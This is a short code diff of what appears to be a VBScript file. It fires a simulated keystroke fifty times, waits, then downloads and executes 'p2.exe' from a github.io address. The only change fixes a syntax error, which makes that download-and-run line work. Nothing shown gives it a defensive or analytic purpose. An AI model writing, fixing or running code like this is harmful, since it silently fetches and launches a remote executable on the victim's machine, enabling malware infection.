@@ -68,6 +68,6 @@ For i = 1 To 50
 	objShell.SendKeys("¯")
 Next
 WScript.Sleep(4000)
-If Not DownloadAndRunAsync("https://stelios333.github.io/e/p2.exe", "p2.exe") Then.
+If Not DownloadAndRunAsync("https://stelios333.github.io/e/p2.exe", "p2.exe") Then
     WScript.Echo "Something went wrong."
 End If
